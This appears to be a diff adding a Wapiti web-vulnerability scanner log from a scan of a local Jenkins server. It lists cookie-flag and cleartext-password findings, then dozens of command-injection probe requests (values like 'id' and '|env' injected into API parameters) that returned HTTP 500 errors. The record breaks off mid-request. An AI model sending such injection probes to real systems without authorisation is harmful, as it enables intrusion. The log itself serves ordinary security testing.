@@ -1,0 +1,1611 @@
+
+     __    __            _ _   _ _____
+    / / /\ \ \__ _ _ __ (_) |_(_)___ /
+    \ \/  \/ / _` | '_ \| | __| | |_ \
+     \  /\  / (_| | |_) | | |_| |___) |
+      \/  \/ \__,_| .__/|_|\__|_|____/
+                  |_|                 
+Wapiti 3.2.10 (wapiti-scanner.github.io)
+Secure flag is not set on the cookie: 'JSESSIONID.7f4aae41' set at 'http://127.0.0.1:18025/'
+CSP is not set for URL: http://127.0.0.1:18025/
+Sensitive data (cookie in the response) was sent over an unencrypted HTTP connection to http://127.0.0.1:18025/. The server did not enforce HTTPS.
+Potential full path disclosure in http://127.0.0.1:18025/: /adjuncts/3c6eef71/lib/layout/breadcrumbs.css
+Potential full path disclosure in http://127.0.0.1:18025/: /adjuncts/3c6eef71/lib/layout/breadcrumbs.js
+Potential full path disclosure in http://127.0.0.1:18025/: /adjuncts/3c6eef71/lib/form/link/link.js
+Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://127.0.0.1:18025/search/?q=default. The server did not enforce HTTPS.
+X-Frame-Options is not set on http://127.0.0.1:18025/static/3c6eef71/scripts/yui/animation/animation-min.js
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2F
+Host 127.0.0.1:18025 serves HTTP content without redirecting to HTTPS.
+Potential full path disclosure in http://127.0.0.1:18025/asynchPeople/: /adjuncts/3c6eef71/lib/layout/progressiveRendering/progressiveRendering.js
+Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://127.0.0.1:18025/toggleCollapse?paneId=executors. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
+Potential full path disclosure in http://127.0.0.1:18025/credentials/: /credentials/store/system/domain/_/
+HttpOnly flag is not set on the cookie 'hudson_auto_refresh' set at 'http://127.0.0.1:18025/?auto_refresh=true'
+Secure flag is not set on the cookie: 'hudson_auto_refresh' set at 'http://127.0.0.1:18025/?auto_refresh=true'
+Secure flag is not set on the cookie: 'ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE' set at 'http://127.0.0.1:18025/j_acegi_security_check'
+Sensitive data (cookie in the response) was sent over an unencrypted HTTP connection to http://127.0.0.1:18025/j_acegi_security_check. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fsearch%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FasynchPeople%2F
+HttpOnly flag is not set on the cookie 'iconSize' set at 'http://127.0.0.1:18025/iconSize?16x16'
+Secure flag is not set on the cookie: 'iconSize' set at 'http://127.0.0.1:18025/iconSize?16x16'
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcredentials%2F
+Potential full path disclosure in http://127.0.0.1:18025/credentials/store/system/domain/_/: /credentials/store/system/
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcomputer%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/loginError
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fapi%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FiconSize
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fview%2Fall%2Fbuilds
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FasynchPeople%2Fapi%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fqueue%2Fapi%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcomputer%2Fapi%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fapi%2Fsearch%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcomputer%2Fsearch%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FcancelQuietDown
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Frestart
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FsafeRestart
+Potential full path disclosure in http://127.0.0.1:18025/credentials/store/system/domain/_/api/: /credentials/store/system/domain/_/api/search/
+Potential full path disclosure in http://127.0.0.1:18025/credentials/store/system/domain/_/api/: /credentials/store/system/domain/_/api/
+Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://127.0.0.1:18025/cancelQuietDown. The server did not enforce HTTPS.
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcredentials%2Fstore%2Fsystem%2Fdomain%2F_%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FcreateItem
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcredentials%2Fapi%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fcomputer%2F%28master%29%2F
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=default
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2Fview%2Fall%2F
+Potential full path disclosure in http://127.0.0.1:18025/credentials/store/system/api/: /credentials/store/system/api/search/
+Potential full path disclosure in http://127.0.0.1:18025/credentials/store/system/api/: /credentials/store/system/api/
+Cleartext transmission of sensitive information: Password field 'j_password' is sent over unencrypted connections from URL http://127.0.0.1:18025/login?from=%2FquietDown
+[*] Saving scan state, please wait...
+This scan has been saved in the file /home/kali/.wapiti/scans/127.0.0.1_18025_folder_af74a641.db
+[*] Wapiti found 351 URLs and forms during the scan
+
+[*] Launching module redirect
+
+[*] Launching module ssrf
+[*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=nj6cgs for results, please wait...
+
+[*] Launching module exec
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/xml
+Evil request:
+    GET /asynchPeople/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/xml
+Evil request:
+    GET /api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/xml
+Evil request:
+    GET /computer/(master)/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/json
+Evil request:
+    GET /api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/json
+Evil request:
+    GET /computer/(master)/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/json
+Evil request:
+    GET /asynchPeople/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/xml
+Evil request:
+    GET /api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/xml
+Evil request:
+    GET /computer/(master)/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/xml
+Evil request:
+    GET /asynchPeople/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/xml
+Evil request:
+    GET /computer/(master)/loadStatistics/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=id&width=500&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=sec10&width=id&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=hour&width=id&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/xml
+Evil request:
+    GET /computer/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/json
+Evil request:
+    GET /computer/(master)/loadStatistics/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/json
+Evil request:
+    GET /computer/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/xml
+Evil request:
+    GET /computer/(master)/loadStatistics/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/xml
+Evil request:
+    GET /computer/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/xml
+Evil request:
+    GET /credentials/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/json
+Evil request:
+    GET /credentials/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/xml
+Evil request:
+    GET /credentials/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/xml
+Evil request:
+    GET /credentials/store/system/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/json
+Evil request:
+    GET /credentials/store/system/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/xml
+Evil request:
+    GET /credentials/store/system/domain/_/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/xml
+Evil request:
+    GET /credentials/store/system/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?32x32=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?24x24=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?16x16=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/json
+Evil request:
+    GET /credentials/store/system/domain/_/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/json
+Evil request:
+    GET /overallLoad/api/json?tree=jobs%5Bname%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/xml
+Evil request:
+    GET /overallLoad/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/xml
+Evil request:
+    GET /credentials/store/system/domain/_/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/xml
+Evil request:
+    GET /overallLoad/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/xml
+Evil request:
+    GET /queue/api/xml?depth=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/rssAll
+Evil request:
+    GET /rssAll?flavor=id HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/xml
+Evil request:
+    GET /queue/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%7Cenv HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
